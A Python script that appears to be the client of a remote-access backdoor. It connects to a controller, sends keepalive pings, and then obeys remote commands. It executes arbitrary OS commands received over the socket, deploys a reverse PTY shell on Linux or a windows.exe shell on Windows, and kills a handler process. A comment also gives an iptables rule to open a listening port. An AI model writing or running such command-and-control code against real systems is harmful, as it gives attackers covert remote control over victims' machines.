#!/usr/bin/env python
# TO open port on linux : sudo  iptables -I INPUT -p tcp --dport 7888 --syn -j ACCEPT
import socket
import os
if os.name == 'posix': # Linux
	import pty
	import tcp_pty_backconnect
from time import sleep


from threading import Thread
from time import sleep

TCP_IP       = '127.0.0.1'
TCP_PORT     = 4444
PTY_PORT_LIN = 31337
PTY_PORT_WIN = 31338


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

def ping():
    while True:
        try:
            s.send('ping')
        except:
            os._exit(0)
        sleep(3)

def inpty(argv):
  pty.spawn(argv)

thread = Thread(target = ping)
thread.start()

while True:
    data = s.recv(8192)
    if "shell" in data:
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((TCP_IP, 7888))
		
        if os.name == 'nt': # Windows
           s1.send("nt")
        else:
           s1.send("posix")
        shelltodeploy = s1.recv(1024)
        if shelltodeploy == 'nt': # Windows
            sleep(1)
            os.system("%s\\windows.exe %s %s" % (os.path.dirname(os.path.abspath(__file__)),TCP_IP, str(PTY_PORT_WIN)))
        elif shelltodeploy == "posix": # Linux
            sleep(1)
            tcp_pty_backconnect.run(TCP_IP,PTY_PORT_LIN)
        os._exit(0)
    elif "restart" in data:
        os._exit(0)
    elif "kill" in data:
        inpty(["pkill", "handler.sh"])
        os._exit(0)
    elif "exec " in data:
        commandtoexecute = data.split(" ")[1]
        os.system(commandtoexecute)

            


